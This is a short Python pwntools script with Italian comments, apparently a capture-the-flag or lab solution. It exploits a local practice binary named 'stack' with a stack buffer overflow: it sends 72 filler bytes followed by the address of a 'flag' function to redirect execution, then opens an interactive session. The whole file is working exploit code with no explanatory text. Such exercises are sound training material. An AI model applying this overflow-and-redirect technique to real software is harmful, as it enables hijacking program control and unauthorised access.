from pwn import *
from pwn import p64

def main():
    e = ELF('../Machines/stack')
    context.binary = e
    p = process(e.path)
    flag_addr = p64(e.symbols['flag']) #Indirizzo della funzione flag

    #Creazione del payload: junk + indirizzo variabile d'ambiente
    payload = b'A'*72
    print(flag_addr)
    payload += flag_addr

    print(payload)

    #Invio payload e ottenimento della shell
    p.sendlineafter(b': ', payload)
    p.interactive()
    p.close()


if __name__ == '__main__':
    main()